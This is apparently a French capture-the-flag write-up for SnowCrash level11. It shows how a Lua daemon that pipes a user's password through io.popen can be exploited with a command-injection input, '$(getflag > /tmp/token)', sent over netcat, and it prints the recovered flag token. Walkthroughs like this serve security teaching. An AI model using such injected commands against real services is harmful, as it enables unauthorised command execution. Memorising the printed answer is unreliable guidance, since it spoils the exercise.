# Level11 - IO.Popen
Pour résoudre le level11, on a un fichier level11.lua, qui est exécuté en daemon. level11 est un script en lua qui va écouter sur le port 5151 et demander un password à l'utilisateur, le hasher et tenter une connection. On peut utiliser `netcat` pour utiliser le programme.

```
level11@SnowCrash:~$ nc localhost 5151
Password: test
Erf nope..
```

En regardant le programme de plus près, on s'aperçoit qu'on utilise `io.popen()` dans la fonction `hash()`. `io.popen()` va exécuter le code qu'on lui passe en argument, et dans le cas de ce programme, on va hasher en sha1 le password que l'on envoie en argument du programme.

```
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

On peut donc injecter une commande dans cet argument et io.popen() l'exécutera.

```
level11@SnowCrash:~$ nc localhost 5151
Password: $(getflag > /tmp/token)
Erf nope..

level11@SnowCrash:~$ cat /tmp/token
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

On a notre token: `fa6v5ateaw21peobuub8ipe6s`

